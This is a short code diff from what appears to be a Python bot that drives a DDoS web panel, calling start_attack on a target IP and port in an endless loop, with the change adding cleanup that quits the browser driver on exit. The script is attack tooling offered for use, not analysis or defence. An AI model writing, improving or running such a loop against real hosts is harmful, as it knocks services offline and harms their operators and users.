@@ -71,14 +71,19 @@ bot.DDoS_page()
 bot.close_button()
 
 i = 1
-while True:
-    
-    try:
-        bot.start_attack(ip, port, config.attack["time"], config.attack["method"])
-        print(f"ejecución: {i}")
-        time.sleep(config.attack["time"])
-        #bot.stop_attack(bot.get_running_attacks(bot.get_cookies())["running"][0]["id"])
-    except Exception as e:
-        traceback.print_exc()
-    finally:
-        i = i + 1
+try:
+    while True:
+        
+        try:
+            bot.start_attack(ip, port, config.attack["time"], config.attack["method"])
+            print(f"ejecución: {i}")
+            time.sleep(config.attack["time"])
+            #bot.stop_attack(bot.get_running_attacks(bot.get_cookies())["running"][0]["id"])
+        except Exception as e:
+            traceback.print_exc()
+        finally:
+            i = i + 1
+finally:
+    print("Terminando proceso...")
+    bot.driver_quit()
+    quit(0)
